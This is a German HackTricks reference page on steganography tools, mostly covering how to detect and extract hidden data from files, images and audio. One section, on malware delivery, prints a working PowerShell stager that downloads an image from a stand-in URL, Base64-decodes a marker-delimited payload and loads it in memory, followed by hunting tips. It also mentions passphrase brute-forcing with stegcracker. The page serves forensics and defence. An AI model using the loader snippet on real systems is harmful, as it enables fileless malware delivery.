# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Extrahieren von Daten aus Dateien**

### **Binwalk**

Ein Werkzeug zum Durchsuchen von Binärdateien nach eingebetteten, versteckten Dateien und Daten. Es wird über `apt` installiert und der Quellcode ist auf [GitHub](https://github.com/ReFirmLabs/binwalk) verfügbar.
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Stellt Dateien anhand ihrer Header und Footer wieder her, nützlich für png-Bilder. Über `apt` installierbar; Quellcode auf [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Hilft beim Anzeigen von Dateimetadaten, verfügbar [hier](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Ähnlich wie exiftool, zum Anzeigen von Metadaten. Installierbar via `apt`, Quellcode auf [GitHub](https://github.com/Exiv2/exiv2), und hat eine [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **Datei**

Identifiziere den Dateityp, mit dem du es zu tun hast.

### **Strings**

Extrahiert lesbare Strings aus Dateien und nutzt verschiedene Encoding-Einstellungen, um die Ausgabe zu filtern.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

Nützlich, um eine veränderte Datei mit ihrer originalen Version, die online gefunden wurde, zu vergleichen.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Versteckte Daten im Text extrahieren**

### **Versteckte Daten in Leerzeichen**

Unsichtbare Zeichen in scheinbar leeren Bereichen können Informationen verbergen. Um diese Daten zu extrahieren, besuche [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Daten aus Bildern extrahieren**

### **Bilddetails mit GraphicMagick identifizieren**

[GraphicMagick](https://imagemagick.org/script/download.php) dient dazu, Bilddateitypen zu bestimmen und mögliche Beschädigungen zu erkennen. Führe den folgenden Befehl aus, um ein Bild zu untersuchen:
```bash
./magick identify -verbose stego.jpg
```
Um eine beschädigte Bilddatei zu reparieren, kann das Hinzufügen eines Metadatenkommentars helfen:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide zur Datenverbergung**

Steghide ermöglicht das Verstecken von Daten in `JPEG, BMP, WAV, and AU` Dateien und kann verschlüsselte Daten einbetten und extrahieren. Die Installation erfolgt einfach über `apt`, und der [source code ist auf GitHub verfügbar](https://github.com/StefanoDeVuono/steghide).

**Befehle:**

- `steghide info file` zeigt an, ob eine Datei versteckte Daten enthält.
- `steghide extract -sf file [--passphrase password]` extrahiert die versteckten Daten, Passwort optional.

Für webbasierte Extraktion besuche [diese Website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Um password cracking gegen Steghide zu versuchen, verwende [stegcracker](https://github.com/Paradoxis/StegCracker.git) wie folgt:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg für PNG- und BMP-Dateien**

zsteg spezialisiert sich auf das Aufspüren von versteckten Daten in PNG- und BMP-Dateien. Die Installation erfolgt via `gem install zsteg`, der Quellcode ist auf [GitHub](https://github.com/zed-0xff/zsteg).

**Befehle:**

- `zsteg -a file` wendet alle Erkennungsmethoden auf eine Datei an.
- `zsteg -E file` spezifiziert eine Payload für die Datenextraktion.

### **StegoVeritas und Stegsolve**

**stegoVeritas** überprüft Metadaten, führt Bildtransformationen durch und wendet unter anderem LSB brute forcing an. Verwende `stegoveritas.py -h` für die vollständige Optionsliste und `stegoveritas.py stego.jpg`, um alle Prüfungen auszuführen.

**Stegsolve** wendet verschiedene Farbfilter an, um versteckten Text oder Nachrichten in Bildern sichtbar zu machen. Es ist auf [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) verfügbar.

### **FFT for Hidden Content Detection**

Fast Fourier Transform (FFT)-Techniken können verdeckte Inhalte in Bildern aufdecken. Nützliche Ressourcen sind:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpy ermöglicht das Einbetten von Informationen in Bild- und Audiodateien und unterstützt Formate wie PNG, BMP, GIF, WebP und WAV. Es ist auf [GitHub](https://github.com/dhsdshdhk/stegpy) verfügbar.

### **Pngcheck for PNG File Analysis**

Zur Analyse von PNG-Dateien oder zur Überprüfung ihrer Authentizität, verwende:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Zusätzliche Tools für die Bildanalyse**

Für weitergehende Untersuchungen, siehe:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Marker-delimited Base64 payloads hidden in images (malware delivery)

Commodity loaders verstecken zunehmend Base64-encoded payloads als Klartext innerhalb ansonsten gültiger Bilder (häufig GIF/PNG). Anstatt pixel-level LSB wird die payload durch eindeutige Start-/End-Marker-Strings begrenzt, die in den Dateitext/Metadaten eingebettet sind. Ein PowerShell stager führt dann aus:
- Lädt das Bild über HTTP(S) herunter
- Findet die Marker-Strings (beobachtete Beispiele: <<sudo_png>> … <<sudo_odt>>)
- Extrahiert den Text dazwischen und Base64-dekodiert ihn zu Bytes
- Lädt die .NET assembly in-memory und ruft eine bekannte Entry-Methode auf (keine Datei auf der Festplatte geschrieben)

Minimales PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Hinweise
- Dies fällt unter ATT&CK T1027.003 (steganography). Marker-Strings variieren zwischen Kampagnen.
- Hunting: scanne heruntergeladene Bilder nach bekannten Delimitern; markiere `PowerShell`, das `DownloadString` gefolgt von `FromBase64String` verwendet.

Siehe auch phishing delivery examples und den vollständigen in-memory invocation flow hier:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Extrahieren von Daten aus Audios**

**Audio steganography** bietet eine einzigartige Methode, Informationen in Audiodateien zu verbergen. Verschiedene Tools werden zum Einbetten oder Extrahieren versteckter Inhalte verwendet.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide ist ein vielseitiges Tool zum Verstecken von Daten in JPEG-, BMP-, WAV- und AU-Dateien. Detaillierte Anweisungen finden sich in der [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Dieses Tool ist mit einer Vielzahl von Formaten kompatibel, einschließlich PNG, BMP, GIF, WebP und WAV. Für weitere Informationen siehe [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg ist entscheidend, um die Integrität von Audiodateien zu prüfen, detaillierte Informationen anzuzeigen und etwaige Unstimmigkeiten zu identifizieren.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg eignet sich hervorragend zum Verbergen und Extrahieren von Daten in WAV-Dateien mithilfe der Least Significant Bit (LSB)-Strategie. Es ist auf [GitHub](https://github.com/ragibson/Steganography#WavSteg) verfügbar. Folgende Befehle:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound ermöglicht die Verschlüsselung und Erkennung von Informationen in Audiodateien mittels AES-256. Es kann von [the official page](http://jpinsoft.net/deepsound/download.aspx) heruntergeladen werden.

### **Sonic Visualizer**

Ein unverzichtbares Tool zur visuellen und analytischen Untersuchung von Audiodateien: Sonic Visualizer kann verborgene Elemente aufdecken, die auf anderem Weg nicht erkennbar sind. Besuche die [official website](https://www.sonicvisualiser.org/) für mehr Informationen.

### **DTMF Tones - Dial Tones**

Das Erkennen von DTMF-Tönen in Audiodateien kann mit Online-Tools wie [this DTMF detector](https://unframework.github.io/dtmf-detect/) und [DialABC](http://dialabc.com/sound/detect/index.html) erfolgen.

## **Weitere Techniken**

### **Binary Length SQRT - QR Code**

Binärdaten, deren Länge eine ganzzahlige Quadratwurzel ergibt, könnten einen QR code darstellen. Verwende dieses Snippet, um das zu prüfen:
```python
import math
math.sqrt(2500) #50
```
Für die Konvertierung von Binärdaten in Bilder siehe [dcode](https://www.dcode.fr/binary-image). Zum Lesen von QR-Codes verwende [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Braille-Übersetzung**

Zum Übersetzen von Braille ist der [Branah Braille Translator](https://www.branah.com/braille-translator) eine ausgezeichnete Ressource.

## **Referenzen**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
